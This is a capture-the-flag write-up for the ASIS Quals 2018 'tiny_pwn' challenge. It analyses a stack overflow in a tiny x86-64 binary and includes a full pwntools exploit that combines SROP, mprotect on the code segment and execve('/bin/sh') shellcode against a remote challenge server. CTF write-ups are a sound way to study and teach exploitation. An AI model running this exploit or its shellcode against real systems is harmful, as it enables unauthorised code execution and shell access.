---
title: Asis Quals 2018 Tinypwn
updated: 2018-05-01 10:57:13
---

- [tiny_pwn](#orgfec5732)



<a id="orgfec5732"></a>

# tiny_pwn


The binary is fairy simple

```nasm
; CALL XREF from 0x004000dd (entry0)                                                                                                       
0x004000b0      4831c0         xor rax, rax                ; [01] -r-x section size 91 named .text                                         
0x004000b3      4831db         xor rbx, rbx                                                                                                
0x004000b6      4831c9         xor rcx, rcx                                                                                                
0x004000b9      4831d2         xor rdx, rdx                                                                                                
0x004000bc      4831ff         xor rdi, rdi                                                                                                
0x004000bf      4831f6         xor rsi, rsi                                                                                                
0x004000c2      4d31c0         xor r8, r8                                                                                                  
0x004000c5      4d31c9         xor r9, r9                                                                                                  
0x004000c8      4d31d2         xor r10, r10                                                                                                
0x004000cb      4d31db         xor r11, r11                                                                                                
0x004000ce      4d31e4         xor r12, r12                                                                                                
0x004000d1      4d31ed         xor r13, r13                                                                                                
0x004000d4      4d31f6         xor r14, r14                                                                                                
0x004000d7      4d31ff         xor r15, r15                                                                                                
0x004000da      4831ed         xor rbp, rbp                                                                                                
0x004000dd      e810000000     call 0x4000f2               ;[1]                                                                            
0x004000e2      b83c000000     mov eax, 0x3c               ; '<' ; 60                                                                      
0x004000e7      4831ff         xor rdi, rdi                                                                                                
0x004000ea      4831f6         xor rsi, rsi                                                                                                
0x004000ed      4831d2         xor rdx, rdx                                                                                                
0x004000f0      0f05           syscall                                                                                                     
; CALL XREF from 0x004000dd (entry0)                                                                                                       
0x004000f2      4881ec280100.  sub rsp, 0x128                                                                                              
0x004000f9      4889e6         mov rsi, rsp                                                                                                
0x004000fc      ba48010000     mov edx, 0x148              ; 328                                                                           
0x00400101      0f05           syscall                                                                                                     
0x00400103      4881c4280100.  add rsp, 0x128                                                                                              
0x0040010a      c3             ret                                                                                                         
```

It first xor's all the registers and then calls `0x4000f2` which creates a buffer of size `0x128` and read `0x148` bytes with read syscall then exit's .

Well there is obvious buffer overflow there , we can overwrite the return address and change the flow of the program . The first obstacle is to set the `rax` register to call appropriate syscall , since there are no gadget for that , we have to relay on the fact that the return value is stored in `rax` register . Well read syscall is a good candidate , we just need to give fixed amount of input and it will return the number of bytes returned thus we can get arbitrary values in rax . But the catch is that to call the read syscall the rax register should be `0` in the binary this is done at the starting and the call instruction is in between will push the address of the next instruction to the stack and if we want control after that we have to overflow till there which conflicts with our purpose of calling read to set rax register .

Since after the first read we can make the value of the rax register values from 0x130 to 0x148 we can effectively call any syscall in that range and it turns out , calling the `getrandom` syscall (318) with rsi and rdx set to 0 returns 0 , ie we can set rax to 0 with this . After that we basically we can call any syscall we want .

So we can do SROP here . But we need address of /bin/sh and we do not have a stack leak , and if we are going to call `sigreturn` we need to point rsp to someplace which is `rw` otherwise it will segfault . One possible option is to call `mprotect` on the text section . Next things is that we need our control back , since we do not have control over the values on this region prior to this syscall . we have no control after the stack being pivoted to the code segment .

Let's examine the code segment

```nasm
pwndbg> x/60gx 0x400000
0x400000:       0x00010102464c457f      0x0000000000000000
0x400010:       0x00000001003e0002      0x00000000004000b0
0x400020:       0x0000000000000040      0x0000000000000120
0x400030:       0x0038004000000000      0x0002000300400002
0x400040:       0x0000000500000001      0x0000000000000000
0x400050:       0x0000000000400000      0x0000000000400000
0x400060:       0x000000000000010b      0x000000000000010b
0x400070:       0x0000000000200000      0x000000066474e551
0x400080:       0x0000000000000000      0x0000000000000000
0x400090:       0x0000000000000000      0x0000000000000000
0x4000a0:       0x0000000000000000      0x0000000000000010
0x4000b0:       0x3148db3148c03148      0x48ff3148d23148c9
0x4000c0:       0xc9314dc0314df631      0x314ddb314dd2314d
0x4000d0:       0x4df6314ded314de4      0x0010e8ed3148ff31
0x4000e0:       0x480000003cb80000      0xd23148f63148ff31
0x4000f0:       0x000128ec8148050f      0x000148bae6894800
0x400100:       0x0128c48148050f00      0x7368732e00c30000
0x400110:       0x742e006261747274      0x0000000000747865
0x400120:       0x0000000000000000      0x0000000000000000
0x400130:       0x0000000000000000      0x0000000000000000
0x400140:       0x0000000000000000      0x0000000000000000
0x400150:       0x0000000000000000      0x0000000000000000
0x400160:       0x000000010000000b      0x0000000000000006
0x400170:       0x00000000004000b0      0x00000000000000b0
```

since the stack grows from higher address to lower address we can pivot the stack to `0x400170` and when ret instruction is executed the control will jump to the address `0x4000b0` which is the entry point of the binary and with the read syscall we can overwrite everything on the code segment. Now we just need to give a shellcode .

My exploit script .

```python
from pwn import *

def p64(hex):
    from struct import pack
    return pack('<' + 'Q' * len(hex), *hex)
context.arch = 'amd64'
context.bits = 64
if True:
    io = remote ("159.65.125.233", 6009)
else:
    # context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug("./TinyPwn",'''
    b * 0x004000b0
    '''
    )


frame = SigreturnFrame(kernel='amd64')

frame.rdx=0x7
frame.rax=0xa
frame.rsi=0x1000
frame.rdi=0x400000

frame.rip = 0x004000f0
frame.rsp = 0x400170

payload = p64([
    0x0,
    0x0])
payload += str(frame)
payload = payload.ljust(0x128,"\x00")
payload += p64([
    0x004000ea,
    0x004000f2,
    0x004000b0,
])
payload = payload.ljust(0x13d,"A")
io.send(payload[:0x13e])
raw_input()
io.sendline("\x00" * 0xe)
raw_input()
shellcode = "\x48\xC7\xC7\x48\x00\x40\x00\x48\x31\xF6\x48\x31\xD2\x48\x31\xC0\xB0\x3B\x0F\x05\xB0\x3C\x0F\x05\x90"
shellcode = shellcode.rjust(0x110,"\x90")
payload = "/bin/sh\x00" + shellcode
io.send(payload)
io.interactive()
```

